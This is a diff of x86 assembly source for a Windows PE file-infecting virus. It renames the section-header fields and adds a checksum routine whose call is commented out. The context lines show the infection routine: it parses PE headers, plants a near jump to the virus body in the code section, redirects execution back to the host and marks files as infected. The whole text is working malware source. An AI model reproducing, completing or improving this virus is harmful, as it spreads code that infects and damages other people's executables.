@@ -61,8 +61,8 @@ struc DATA
     .oldRawSize:              resd 1
     .newRawSize:              resd 1
     .incRawSize:              resd 1
-    .codeSegment:             resd 1
-    .lastSegment:             resd 1
+    .codeHeaderAddress:       resd 1
+    .lastHeaderAddress:       resd 1
     .diskEP:                  resd 1
     .virusAddress:            resd 1
     .virusLocation:           resd 1
@@ -249,6 +249,24 @@ doneInfecting:
 
 ;; HELPER FUNCTIONS
 
+;;  Input:  edx - buffer pointer, ecx - buffer length
+;;  Output: eax - the checksum
+PECheckSum:
+    push    ecx         ; save the length for later
+    shr     ecx, 1      ; we're summing WORDs, not bytes 
+    xor     eax, eax    ; EAX holds the checksum     
+    clc                 ; Clear the carry flag ready for later... 
+    
+    theLoop: 
+    adc	ax, [edx + (ecx * 2) - 2] 
+    dec	ecx 
+    jnz	theLoop 
+    
+    pop     ecx
+    adc     eax, ecx
+    ret 
+
+
 ;; Infects a file
 ;;    - esi = filename
 ;;    - ecx = filesize
@@ -375,12 +393,12 @@ OkGo:
     mov     eax, [esi + PE.FileAlignment]
     mov     dword [ebp + DATA.fileAlign], eax       ; Save File Alignment ; (EAX = File Alignment)
     PRINT_TRACE ;3
-
+    
     mov     ebx, [esi + PE.NumberOfRvaAndSizes]     ; Number of directories entries, PE + 0x74
     shl     ebx, 3                                  ; * 8 (size of data directories)
     add     ebx, PE.size                            ; add size of PE header
     add     ebx, [ebp + DATA.PEHeader]              ; EBX = address of the .text section
-    mov     [ebp + DATA.codeSegment], ebx
+    mov     [ebp + DATA.codeHeaderAddress], ebx     ; save codeHeaderAddress
     PRINT_TRACE ;4
 
 
@@ -398,11 +416,11 @@ OkGo:
     add     esi, PE.size
     add     esi, ebx
     add     esi, eax                                ; ESI = Pointer to the last section header
-    mov     [ebp + DATA.lastSegment], esi
+    mov     [ebp + DATA.lastHeaderAddress], esi
 
     PRINT_TRACE ;5
 
-    mov     ebx, [ebp + DATA.codeSegment]
+    mov     ebx, [ebp + DATA.codeHeaderAddress]     ; EBX points to the code header
     mov     eax, [ebx + SECTIONH.PointerToRawData]  ; pointer to raw data of code segment
     add     eax, [ebx + SECTIONH.VirtualSize]       ; virtual size of code segment
     mov     [ebp + DATA.diskEP], eax                ; where exectuable code is (entryPoint will jump here)
@@ -475,8 +493,8 @@ OkGo:
     ;; order to find its address we have the following formula:
     ;; VirtualAddress + VirtualSize - VirusLength + RawSize = VirusStart
 
-    mov     eax, [ebp + DATA.codeSegment]
-    mov     ebx, [ebp + DATA.codeSegment]
+    mov     eax, [ebp + DATA.codeHeaderAddress]
+    mov     ebx, [ebp + DATA.codeHeaderAddress]
     mov     eax, [ebx + SECTIONH.VirtualAddress]            ; Reading code segment's RVA
     add     eax, [ebx + SECTIONH.VirtualSize]               ; Add the size of the segment
     PRINT_TRACE;11
@@ -505,15 +523,15 @@ OkGo:
     add     eax, [ebp + DATA.mapAddress]
 
     mov     [eax], byte JMP_NR                          ; relative near jump instruction
-    mov     ebx, [ebp + DATA.lastSegment]
+    mov     ebx, [ebp + DATA.lastHeaderAddress]
     mov     ebx, [ebx + SECTIONH.VirtualAddress]        ; lastSegment address
     PRINTH "lastSegment address", ebx
-    mov     ecx, [ebp + DATA.codeSegment]
+    mov     ecx, [ebp + DATA.codeHeaderAddress]
     sub     ebx, [ecx + SECTIONH.VirtualAddress]        ; - codeSegment address
     PRINTH "codeSegment address", [ecx]
     add     ebx, [ebp + DATA.oldVSOfLast]               ; + lastSegment size
     PRINTH "lastSegment size", [ecx]
-    mov     ecx, [ebp + DATA.codeSegment]
+    mov     ecx, [ebp + DATA.codeHeaderAddress]
     sub     ebx, [ecx + SECTIONH.VirtualSize]           ; - codeSegment size
     PRINTH "codeSegment size", [ecx]
     sub     ebx, JMP_NR_BYTES                           ; subtract length of the jump instruction (it takes up 5 bytes of space)
@@ -537,7 +555,7 @@ OkGo:
     PRINT_TRACE ;16
 
     ; Transfer execution to the host entry point
-    mov     ecx, [ebp + DATA.codeSegment]
+    mov     ecx, [ebp + DATA.codeHeaderAddress]
     add     ebx, [ecx + SECTIONH.VirtualSize]   ; add Size of CodeSegment
     sub     ebx, [ebp + DATA.oldEntryPoint]     ; subtract old entry point
     add     ebx, 0x1000                         ; correct for BaseOfCode
@@ -565,6 +583,15 @@ OkGo:
     mov     esi, [ebp + DATA.mapAddress]
     mov     word [esi + AD_OFFSET], AD              ;'AD'  ; Mark file as infected
     PRINT_TRACE ;16
+    
+    ; Recompute PE checksum
+    ;mov     edx, [ebp + DATA.PEHeader]
+    ;mov     eax, [edx + PE.CheckSum]
+    ;PRINTH  "checksum", eax
+    ;mov     [edx + PE.CheckSum], dword 0            ; clear the old checksum
+    ;mov     ecx, PE.size
+    ;call    PECheckSum
+    ;mov     [edx + PE.CheckSum], eax                ; save the new checksum
 
 UnmapView:
     mov     ebx, [ebp + DATA.mapAddress]
